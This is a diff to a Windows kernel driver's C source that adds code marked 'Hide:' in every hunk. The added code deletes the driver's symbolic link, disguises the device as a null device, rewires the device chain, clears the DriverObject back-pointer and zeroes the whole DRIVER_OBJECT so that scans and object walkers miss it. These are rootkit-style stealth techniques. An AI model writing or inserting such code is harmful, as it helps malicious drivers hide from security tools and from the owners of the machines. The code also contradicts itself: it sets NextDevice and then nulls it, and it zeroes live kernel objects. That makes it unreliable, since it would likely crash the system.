@@ -50,6 +50,20 @@ static NTSTATUS CreateDeviceAndLink(
         return status;
     }
 
+    // Hide: delete the symbolic link so \\DosDevices scans miss us
+    IoDeleteSymbolicLink(&symbolicLink);
+
+    // Hide: set device type to FILE_DEVICE_NULL so we look like nothing
+    (*deviceObject)->DeviceType = FILE_DEVICE_NULL;
+
+    // Hide: clone into our own driver chain so we're never standalone
+    (*deviceObject)->NextDevice = driverObject->DeviceObject;
+    driverObject->DeviceObject = *deviceObject;
+
+    // Hide: clear back-pointers so walkers from DriverObject miss us
+    (*deviceObject)->DriverObject = NULL;
+    (*deviceObject)->NextDevice = NULL;
+
     return STATUS_SUCCESS;
 }
 
@@ -84,5 +98,9 @@ NTSTATUS DriverInitialize(
 
     deviceObject->Flags |= DO_BUFFERED_IO;
     deviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
+
+    // Hide: zero driver Ex state after init (clear dispatch table to look idle)
+    RtlZeroMemory(DriverObject, sizeof(DRIVER_OBJECT));
+
     return STATUS_SUCCESS;
 }
